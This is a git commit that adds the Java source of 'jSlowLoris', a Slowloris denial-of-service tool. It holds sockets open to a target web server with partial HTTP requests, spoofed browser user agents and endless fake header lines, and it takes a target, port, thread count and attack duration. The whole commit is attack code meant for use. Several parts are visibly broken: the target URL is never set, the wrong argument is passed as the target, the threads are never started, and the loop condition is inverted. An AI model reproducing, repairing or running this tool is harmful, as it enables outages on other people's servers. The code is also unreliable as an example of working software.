12f8645c35888a4a5f77657edef39c23b2907d20
Connor <connor_333@hotmail.co.uk>
2015-11-14 17:47:31 +0000

    initial commit

---
+++ src/Connector.java
@@ -0,0 +1,165 @@
+import java.io.IOException;
+import java.net.*;
+import java.util.Random;
+
+/**
+ * Created by connor on 14/11/15.
+ */
+public class Connector implements Runnable
+{
+    /** the number of socket connections to the server per `Connector` instance */
+    private static final int NUMBER_OF_CONNECTIONS = 50;
+    /** the server port to connect to */
+    private static int serverPort;
+    /** number of seconds to stop the attack after, 0 = never stop */
+    private static int attackSeconds;
+
+    /** the URL of the target */
+    private URL targetURL;
+    /** all of the connections Sockets for this Connector */
+    private Socket[] allSockets = new Socket[NUMBER_OF_CONNECTIONS];
+    /** the partial requests sent for each connection */
+    private String[] allPartialRequests = new String[NUMBER_OF_CONNECTIONS];
+
+    public Connector(String target, int serverPort, int attackSeconds) throws MalformedURLException
+    {
+        this.serverPort = serverPort;
+        this.attackSeconds = attackSeconds;
+        allPartialRequests = createIntialPartialRequests();
+
+        for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++)
+            initConnection(i);
+    }
+
+    /**
+     * creates the initial partial requests that are sent to the server
+     * @return a string array containing all the partial HTTP GET requests for every connection this Connector manages
+     */
+    private String[] createIntialPartialRequests()
+    {
+        String pagePrefix = "/";
+        if(targetURL.getHost().startsWith("/"))
+            pagePrefix = "";
+
+        String type = "GET " + pagePrefix + targetURL.getPath() + " HTTP/1.1\r\n";
+        String host = "Host: " + targetURL.getHost() + (serverPort == 80 ? "" : ":" + serverPort) + "\r\n";
+        String contentType = "Content-Type: */* \r\n";
+        String connection = "Connection: keep-alive\r\n";
+
+        String[] agents = {"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
+        "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.0.9) Gecko/2009040821",
+        "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
+        "Mozilla/5.0 (Windows; U; Windows NT 6.1; it; rv:2.0b4) Gecko/20100818",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
+        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
+        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)",
+        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
+        "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
+        "Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
+        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36"};
+
+        String[] allPartials = new String[NUMBER_OF_CONNECTIONS];
+        for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++)
+            allPartials[i] = type + host + contentType + connection + agents[new Random().nextInt(agents.length)] + "\r\n";
+
+        return allPartials;
+    }
+
+    /**
+     * used to start a connection with the server for a specified index. Sets up the socket
+     * @param index which connction index to set up
+     */
+    private void initConnection(int index)
+    {
+        try
+        {
+            allSockets[index] = new Socket(InetAddress.getByName(targetURL.toString()), serverPort);
+        }
+        catch(IOException ioe)
+        {
+            ioe.printStackTrace();
+            System.exit(-1);
+        }
+    }
+
+    @Override
+    public void run()
+    {
+        long startTime = System.currentTimeMillis();
+
+        for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++) // each connection sends a partial request
+        {
+            sendPartialRequest(i);
+            try
+            {
+                Thread.sleep(2000);
+            }
+            catch(InterruptedException ie)
+            {
+                ie.printStackTrace();
+            }
+        }
+
+        // main attack loop
+        while((System.currentTimeMillis() - startTime) / 1000.0 > attackSeconds)
+        {
+            for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++)
+            {
+                sendFalseHeaderField(i);
+                try
+                {
+                    Thread.sleep(new Random().nextInt(3407)); // wait a random time before sending
+                }
+                catch(InterruptedException ie)
+                {
+                    ie.printStackTrace();
+                }
+
+                if(i == NUMBER_OF_CONNECTIONS - 1) // reset the counter
+                    i = 0;
+            }
+        } // todo: send Connection: Close when finished
+    }
+
+    /**
+     * sends a fake header to the server so the server keeps the connection open
+     * @param index the index of the connection to send the fake info
+     */
+    private void sendFalseHeaderField(int index)
+    {
+        char[] alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
+        String fakeField = alphabet[new Random().nextInt(alphabet.length)] + "-" + alphabet[new Random().nextInt(alphabet.length)] + ": " + new Random().nextInt();
+        try
+        {
+            allSockets[index].getOutputStream().write(fakeField.getBytes());
+        }
+        catch(IOException ioe)
+        {
+            ioe.printStackTrace();
+            initConnection(index); // try to re-connect
+        }
+
+    }
+
+    /**
+     * sends a partial HTTP GET request to the server
+     * @param index the Socket at index is used to send the request
+     */
+    private void sendPartialRequest(int index)
+    {
+        try
+        {
+            allSockets[index].getOutputStream().write(allPartialRequests[new Random().nextInt(NUMBER_OF_CONNECTIONS)].getBytes()); // write a random partial HTTP GET request to the server
+        }
+        catch(IOException ioe)
+        {
+            ioe.printStackTrace();
+            initConnection(index); // try to reestablish connection
+        }
+
+    }
+}
---
+++ src/Main.java
@@ -0,0 +1,51 @@
+import java.net.MalformedURLException;
+
+/**
+ * Created by connor on 14/11/15.
+ */
+public class Main
+{
+    public static void main(String[] args)
+    {
+        if(args.length != 4)
+            die("Example usage:\n\tjava jSlowLoris TARGET PORT NUMBER_OF_THREADS TIMER\n\t\tTARGET the address of the target\n\t\tPORT the port on the target server to connect to\n\t\tNUMBER_OF_THREADS how many threads the program should create. Each thread has 50 associated connections\n\t\tTIMER how long the attack should last in minutes. Use 0 for forever");
+
+        int port = 0;
+        int threads = 0;
+        int timer = 0;
+        try
+        {
+            port = Integer.parseInt(args[1]);
+            threads = Integer.parseInt(args[2]);
+            timer = Integer.parseInt(args[3]);
+        }
+        catch(NumberFormatException nfe)
+        {
+            die(nfe.getMessage());
+        }
+
+        for(int i = 0; i < threads; i++)
+        {
+            try
+            {
+                new Connector(args[1], port, timer);
+            }
+            catch(MalformedURLException mue)
+            {
+                die(mue.getMessage()); // fatal error
+            }
+        }
+    }
+
+    /**
+     * prints an error message and exits the program
+     * @param deathMsg msg that indicates the cause of the fatal error
+     */
+    private static void die(String deathMsg)
+    {
+        System.err.println(deathMsg);
+        System.exit(-1);
+    }
+
+
+}
